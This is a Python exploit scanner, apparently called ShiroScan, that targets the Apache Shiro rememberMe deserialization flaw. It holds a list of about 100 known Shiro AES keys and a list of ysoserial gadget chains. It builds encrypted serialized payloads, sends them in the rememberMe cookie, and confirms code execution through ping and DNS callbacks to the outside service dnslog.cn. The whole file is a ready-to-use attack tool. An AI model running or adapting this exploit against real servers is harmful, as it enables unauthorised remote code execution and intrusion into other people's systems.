import time
import base64
import uuid
import requests,re,subprocess
import binascii
from Crypto.Cipher import AES

shiro_key = ['L7RioUULEFhRyxM7a2R/Yg==','kPH+bIxk5D2deZiIxcaaaA==', '4AvVhmFLUs0KTA3Kprsdag==', 'Z3VucwAAAAAAAAAAAAAAAA==', 'fCq+/xW488hMTCD+cmJ3aQ==', '0AvVhmFLUs0KTA3Kprsdag==', '1AvVhdsgUs0FSA3SDFAdag==', '1QWLxg+NYmxraMoxAXu/Iw==', '25BsmdYwjnfcWmnhAciDDg==', '2AvVhdsgUs0FSA3SDFAdag==', '3AvVhmFLUs0KTA3Kprsdag==', '3JvYhmBLUs0ETA5Kprsdag==', 'r0e3c16IdVkouZgk1TKVMg==', '5aaC5qKm5oqA5pyvAAAAAA==', '5AvVhmFLUs0KTA3Kprsdag==', '6AvVhmFLUs0KTA3Kprsdag==', '6NfXkC7YVCV5DASIrEm1Rg==', '6ZmI6I2j5Y+R5aSn5ZOlAA==', 'cmVtZW1iZXJNZQAAAAAAAA==', '7AvVhmFLUs0KTA3Kprsdag==', '8AvVhmFLUs0KTA3Kprsdag==', '8BvVhmFLUs0KTA3Kprsdag==', '9AvVhmFLUs0KTA3Kprsdag==', 'OUHYQzxQ/W9e/UjiAGu6rg==', 'a3dvbmcAAAAAAAAAAAAAAA==', 'aU1pcmFjbGVpTWlyYWNsZQ==', 'bWljcm9zAAAAAAAAAAAAAA==', 'bWluZS1hc3NldC1rZXk6QQ==', 'bXRvbnMAAAAAAAAAAAAAAA==', 'ZUdsaGJuSmxibVI2ZHc9PQ==', 'wGiHplamyXlVB11UXWol8g==', 'U3ByaW5nQmxhZGUAAAAAAA==', 'MTIzNDU2Nzg5MGFiY2RlZg==', 'L7RioUULEFhRyxM7a2R/Yg==', 'a2VlcE9uR29pbmdBbmRGaQ==', 'WcfHGU25gNnTxTlmJMeSpw==', 'OY//C4rhfwNxCQAQCrQQ1Q==', '5J7bIJIV0LQSN3c9LPitBQ==', 'f/SY5TIve5WWzT4aQlABJA==',  'ZWvohmPdUsAWT3=KpPqda', 'YI1+nBV//m7ELrIyDHm6DQ==', '6Zm+6I2j5Y+R5aS+5ZOlAA==', '2A2V+RFLUs+eTA3Kpr+dag==', '6ZmI6I2j3Y+R1aSn5BOlAA==', 'SkZpbmFsQmxhZGUAAAAAAA==', '2cVtiE83c4lIrELJwKGJUw==', 'fsHspZw/92PrS3XrPW+vxw==', 'XTx6CKLo/SdSgub+OPHSrw==', 'sHdIjUN6tzhl8xZMG3ULCQ==', 'O4pdf+7e+mZe8NyxMTPJmQ==', 'HWrBltGvEZc14h9VpMvZWw==', 'rPNqM6uKFCyaL10AK51UkQ==', 'Y1JxNSPXVwMkyvES/kJGeQ==', 'lT2UvDUmQwewm6mMoiw4Ig==', 'MPdCMZ9urzEA50JDlDYYDg==', 'xVmmoltfpb8tTceuT5R7Bw==', 'c+3hFGPjbgzGdrC+MHgoRQ==', 'ClLk69oNcA3m+s0jIMIkpg==', 'Bf7MfkNR0axGGptozrebag==', '1tC/xrDYs8ey+sa3emtiYw==', 'ZmFsYWRvLnh5ei5zaGlybw==', 'cGhyYWNrY3RmREUhfiMkZA==', 'IduElDUpDDXE677ZkhhKnQ==', 'yeAAo1E8BOeAYfBlm4NG9Q==', 'cGljYXMAAAAAAAAAAAAAAA==', '2itfW92XazYRi5ltW0M2yA==', 'XgGkgqGqYrix9lI6vxcrRw==', 'ertVhmFLUs0KTA3Kprsdag==', '5AvVhmFLUS0ATA4Kprsdag==', 's0KTA3mFLUprK4AvVhsdag==', 'hBlzKg78ajaZuTE0VLzDDg==', '9FvVhtFLUs0KnA3Kprsdyg==','d2ViUmVtZW1iZXJNZUtleQ==', 'yNeUgSzL/CfiWw1GALg6Ag==', 'NGk/3cQ6F5/UNPRh8LpMIg==', '4BvVhmFLUs0KTA3Kprsdag==', 'MzVeSkYyWTI2OFVLZjRzZg==', 'CrownKey==a12d/dakdad', 'empodDEyMwAAAAAAAAAAAA==', 'A7UzJgh1+EWj5oBFi+mSgw==', 'YTM0NZomIzI2OTsmIzM0NTueYQ==', 'c2hpcm9fYmF0aXMzMgAAAA==', 'i45FVt72K2kLgvFrJtoZRw==', 'U3BAbW5nQmxhZGUAAAAAAA==', 'ZnJlc2h6Y24xMjM0NTY3OA==', 'Jt3C93kMR9D5e8QzwfsiMw==', 'MTIzNDU2NzgxMjM0NTY3OA==', 'vXP33AonIp9bFwGl7aT7rA==', 'V2hhdCBUaGUgSGVsbAAAAA==', 'Z3h6eWd4enklMjElMjElMjE=', 'Q01TX0JGTFlLRVlfMjAxOQ==', 'ZAvph3dsQs0FSL3SDFAdag==', 'Is9zJ3pzNh2cgTHB4ua3+Q==', 'NsZXjXVklWPZwOfkvk6kUA==', 'GAevYnznvgNCURavBhCr1w==', '66v1O8keKNV3TTcGPK1wzg==', 'SDKOLKn2J1j/2BHjeZwAoQ==','3qDVdLawoIr1xFd6ietnwg==']

jar = ['CommonsBeanutils1', 'CommonsCollections1', 'CommonsCollections2', 'CommonsCollections3', 'CommonsCollections4', 'CommonsCollections5', 'CommonsCollections6', 'CommonsCollections7', 'CommonsCollections8', 'CommonsCollections9', 'CommonsCollections10', 'Jdk7u21', 'Hibernate1', 'Hibernate2', 'Spring1', 'Spring2', 'Spring3', 'Myfaces1', 'Myfaces2', 'C3P0', 'Clojure', 'FileUpload1', 'Groovy1', 'BeanShell1', 'JBossInterceptors1', 'JSON1', 'JavassistWeld1', 'Jython1', 'MozillaRhino1', 'MozillaRhino2', 'ROME', 'Vaadin1', 'Wicket1']

header = {
		'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36',
		'Connection':'close'
	}

#shiro_vul = {"real_key":"kPH+bIxk5D2deZiIxcaaaA==","real_jar":"CommonsCollections5"}

def poc(url):
    try:
        rep = requests.get('http://dnslog.cn/getdomain.php', headers=header, timeout=20)
        searchobj = re.search('=(.*);', rep.headers['Set-Cookie'])
        target = rep.text  #获取测试域名
        for real_key in shiro_key:

            payload = generator(target, real_key)
            requests.get(url, cookies={'rememberMe': payload.decode()}, headers=header,timeout=5, verify=False)
            time.sleep(0.5)

            rep1 = requests.get('http://dnslog.cn/getrecords.php', cookies={'PHPSESSID': searchobj.group(1)} ,headers=header, timeout=5)

            print('now is testing： ',real_key)
            if 'dnslog' in rep1.text:
                print('[+]target is vulnerable')
                print('[+]key：{}'.format(real_key))

                rep1 = requests.get('http://dnslog.cn/getdomain.php', headers=header, timeout=10)
                rep2 = requests.get('http://dnslog.cn/getdomain.php', headers=header, timeout=10)

                for real_jar in jar:
                    if test(url,rep1,real_key,real_jar,'linux'):
                        return 1
                    if test(url,rep2,real_key,real_jar,'windows'):
                        return 1

                print('[+]target is vulnerable and key：{} but vulnerable jar not found!'.format(real_key))
                return 1
                #print('[*]vulnerable jar not found!')
                #return
            #print('[-]target is not vulnerable')
            #return
        print('[-]target is not vulnerable')
    except Exception as e:
        print('发生错误: %s'%type(e))

def test(url,rep,real_key,real_jar,platform):
    searchobj1 = re.search('=(.*);', rep.headers['Set-Cookie'])
    dnslog = rep.text  #获取测试域名

    payload = generator1(real_jar, dnslog, real_key, platform)

    requests.get(url, cookies={'rememberMe': payload.decode()}, headers=header,timeout=5, verify=False)
    time.sleep(1)
    rep1 = requests.get('http://dnslog.cn/getrecords.php', cookies={'PHPSESSID': searchobj1.group(1)} ,headers=header, timeout=5)

    if 'dnslog' in rep1.text:
        print('[+]target is vulnerable')
        print('[+]key：{}'.format(real_key))
        print('[+]gadgetr： {}'.format(real_jar))
        print('[+]platform： {}'.format(platform))
        return 1



def generator(url, real_key='kPH+bIxk5D2deZiIxcaaaA=='):
    url0 = url
    url1 = 'http://' + url
    payload = 'aced0005737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000c770800000010000000017372000c6a6176612e6e65742e55524c962537361afce47203000749000868617368436f6465490004706f72744c0009617574686f726974797400124c6a6176612f6c616e672f537472696e673b4c000466696c6571007e00034c0004686f737471007e00034c000870726f746f636f6c71007e00034c000372656671007e00037870ffffffffffffffff740010{0}74000071007e0005740004687474707078740017{1}78'.format(binascii.hexlify(url0.encode()).decode(),binascii.hexlify(url1.encode()).decode())
    payload = binascii.a2b_hex(payload)
    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    key = real_key
    mode = AES.MODE_CBC
    iv = uuid.uuid4().bytes
    encryptor = AES.new(base64.b64decode(key), mode, iv)
    file_body = pad(payload)
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    return base64_ciphertext

def generator1(real_jar,command,real_key='kPH+bIxk5D2deZiIxcaaaA==',platform='linux'):
    if platform == 'linux':
        command = 'ping -c 2 {}'.format(command)
    elif platform == 'windows':
        command = 'ping {}'.format(command)
    command = "java -jar ysoserial.jar {} \"{}\"".format(real_jar,command)
    popen = subprocess.Popen(command, stdout=subprocess.PIPE ,shell=True,close_fds=True)
    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    key = base64.b64decode(real_key)
    iv = uuid.uuid4().bytes
    encryptor = AES.new(key, AES.MODE_CBC, iv)
    out,drr = popen.communicate()
    file_body = pad(out)
    print(command)
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    return base64_ciphertext


banner='''
 ____  _     _          ____                  
/ ___|| |__ (_)_ __ ___/ ___|  ___ __ _ _ __  
\___ \| '_ \| | '__/ _ \___ \ / __/ _` | '_ \ 
 ___) | | | | | | | (_) |__) | (_| (_| | | | |
|____/|_| |_|_|_|  \___/____/ \___\__,_|_| |_|

                           By 憨憨
'''
print(banner)
print("[*]用法：只需点击验证即可，自动测试100个Key，请耐心等候!")
def check(**kwargs):
    result = poc(kwargs['url'])
    return result

if __name__ == "__main__":
    url = ''
    poc(url)
    



